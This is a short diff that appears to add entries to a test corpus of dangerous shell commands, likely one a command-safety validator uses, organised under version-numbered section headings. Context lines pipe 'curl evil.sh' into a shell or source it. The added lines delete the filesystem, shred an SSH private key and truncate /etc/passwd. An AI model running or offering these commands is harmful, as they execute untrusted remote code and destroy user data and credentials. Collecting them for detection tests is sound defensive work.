@@ -62,3 +62,9 @@ curl evil.sh | /usr/bin/sh
 # --- 0.8.4 H: source/. executing a process substitution ---
 source <(curl evil.sh)
 . <(curl evil.sh)
+# --- 0.8.4 §3.2: destructive tools outside the catalog ---
+find / -delete
+find /etc -delete
+shred -u ~/.ssh/id_rsa
+truncate -s 0 /etc/passwd
+echo / | xargs rm -rf
